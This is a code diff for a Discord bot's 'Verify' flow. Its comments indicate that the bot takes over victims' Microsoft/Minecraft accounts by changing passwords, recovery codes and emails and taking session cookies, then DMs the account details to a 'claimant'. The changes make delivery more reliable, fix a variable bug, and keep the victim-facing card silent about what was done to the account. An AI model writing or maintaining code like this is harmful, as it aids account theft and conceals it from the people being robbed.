@@ -29,6 +29,8 @@ from discord import AllowedMentions, Embed, Interaction, abc
 
 from securing.account_filters import is_embed_verify_no_minecraft
 from securing.build_embeds import build_account_embeds, public_secure_reason
+from securing.build_embeds import public_verify_failure
+from shared import interactions
 from shared.send_logs import send_logs, build_log_embed
 from shared.post_verification import after_verify
 from ui import theme
@@ -162,11 +164,16 @@ def _no_mc_card() -> discord.ui.DesignerView:
 
 
 def _verify_fail_card(reason: str | None = None) -> discord.ui.DesignerView:
-    description = (
-        public_secure_reason(reason)
-        or "We couldn't complete this right now. Please try again in a few minutes."
+    """The one card the person who pressed Verify sees when it fails.
+
+    The card never says what the pipeline was doing (password / recovery code /
+    primary email changes, Microsoft session cookies). The technical reason is
+    kept in the operator log channel instead.
+    """
+    return theme.fail_card(
+        "Could not finish verification",
+        public_verify_failure(reason),
     )
-    return theme.fail_card("Could not finish verification", description)
 
 
 async def _dm_result(interaction: Interaction, payload) -> bool:
@@ -200,6 +207,10 @@ async def set_verify_ephemeral(interaction: Interaction, payload) -> None:
     ``payload`` may be a :class:`discord.ui.DesignerView` (Components V2 card)
     or a classic :class:`discord.Embed`. A component/modal interaction edits the
     card in place so the user sees one evolving message instead of a stack.
+
+    Every answer goes through :mod:`shared.interactions`, so an expired
+    (10062) or already-acknowledged interaction does not blow up the flow -
+    the result is delivered by DM instead.
     """
     is_card = isinstance(payload, discord.ui.DesignerView)
     if is_card:
@@ -209,28 +220,37 @@ async def set_verify_ephemeral(interaction: Interaction, payload) -> None:
 
     try:
         if interaction.message is not None and not interaction.response.is_done():
-            await interaction.response.edit_message(**kwargs)
-            return
-        if interaction.response.is_done():
-            await interaction.edit_original_response(**kwargs)
-            return
-        if is_card:
-            await interaction.response.send_message(view=payload, ephemeral=True)
+            if await interactions.edit(interaction, **kwargs):
+                return
+        elif interaction.response.is_done():
+            if await interactions.edit_original(interaction, **kwargs):
+                return
         else:
-            await interaction.response.send_message(embed=payload, ephemeral=True)
-        return
+            if is_card:
+                sent = await interactions.respond(
+                    interaction, view=payload, ephemeral=True
+                )
+            else:
+                sent = await interactions.respond(
+                    interaction, embed=payload, ephemeral=True
+                )
+            if sent:
+                return
     except Exception:
-        log.warning("edit verify message failed — trying followup", exc_info=True)
+        log.warning("edit verify message failed - trying followup", exc_info=True)
 
     try:
         if is_card:
-            await interaction.followup.send(view=payload, ephemeral=True)
+            sent = await interactions.followup(interaction, view=payload, ephemeral=True)
         else:
-            await interaction.followup.send(embed=payload, ephemeral=True)
+            sent = await interactions.followup(interaction, embed=payload, ephemeral=True)
     except Exception as exc:
         # 10015 / NotFound means the interaction token expired; anything else is
         # a permissions problem. Either way a DM still reaches the user.
         log.warning("could not update the verify message (%s) - falling back to DM", exc)
+        sent = False
+
+    if not sent:
         await _dm_result(interaction, payload)
 
 
@@ -575,6 +595,11 @@ async def publish_embed_secure_result(
 
     # Send the full secured account details to the claimant via DM when they
     # press Claim. The public card above intentionally hides the raw fields.
+    #
+    # ``claimed_by_id`` is filled in from the claim row below and is reused by
+    # the secondary notice at the end - it used to be read there without ever
+    # being assigned in this scope, which raised a NameError on every hit.
+    claimed_by_id: int | None = None
     try:
         db = DBConnection()
         account_id = None
@@ -585,9 +610,10 @@ async def publish_embed_secure_result(
         if account_id:
             claim = db.get_claim(account_id)
             if claim and claim.get("claimed_by_user_id"):
+                claimed_by_id = int(claim["claimed_by_user_id"])
                 target = None
                 try:
-                    target = await interaction.client.fetch_user(int(claim["claimed_by_user_id"]))
+                    target = await interaction.client.fetch_user(claimed_by_id)
                 except Exception:
                     log.warning("claim DM lookup failed for account %s", account_id, exc_info=True)
                 if target is not None:
@@ -602,7 +628,7 @@ async def publish_embed_secure_result(
         claim=True,
         mc_name=mc_name,
         username=username,
-        claimed_by_id=claimed_by_user_id,
+        claimed_by_id=claimed_by_id,
     )
 
     return True
